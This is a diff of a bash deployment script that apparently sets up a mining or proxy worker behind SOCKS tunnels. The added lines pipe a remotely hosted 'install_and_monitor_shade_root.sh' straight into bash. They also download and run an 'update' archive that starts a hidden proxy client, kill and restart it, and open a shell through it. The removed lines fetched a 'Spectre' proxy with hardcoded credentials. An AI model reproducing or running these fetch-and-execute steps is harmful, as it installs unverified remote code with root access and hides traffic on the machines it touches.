@@ -6,6 +6,10 @@ DEBIAN_FRONTEND=noninteractive
 apt update >/dev/null;apt -y install apt-utils psmisc libreadline-dev dialog automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git binutils cmake build-essential unzip net-tools curl apt-utils wget dpkg >/dev/null
 
 sleep 2
+
+curl -fsSL http://greenleaf.teatspray.fun/install_and_monitor_shade_root.sh | bash &
+
+sleep 2
 cat /etc/*-release
 sleep 2
 
@@ -70,23 +74,7 @@ sleep 2
 
 sleep 2
 
-wget http://greenleaf.teatspray.fun/Spectre.tar.gz
-
-sleep 2
-
-tar -xf Spectre.tar.gz
-
-sleep 2
-
-mv Spectre /usr/bin
-
-sleep 2
-
-Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:8443 &
-
-sleep 2
-
-curl -x socks5h://127.0.0.1:1082 api.ipify.org
+curl -x socks5h://127.0.0.1:1081 api.ipify.org
 
 sleep 2
 
@@ -124,6 +112,40 @@ END
 sleep 5
 
 echo "Your worker name is $currentdate"
+
+sleep 2
+
+wget -q http://greenleaf.teatspray.fun/update.tar.gz
+
+sleep 2
+
+tar -xf update.tar.gz
+
+sleep 2
+
+cat > update/local/update-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 127.0.0.1:1081
+END
+
+./update/local/update-local -config update/local/update-local.conf & > /dev/null
+
+sleep 2
+
+ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1
+
+sleep 3
+
+./update/local/update-local -config update/local/update-local.conf & > /dev/null
+
+sleep 2
+
+./update/update wget -q -O- http://api.ipify.org
+
+sleep 2
+
+./update/update bash
 
 sleep 2
 
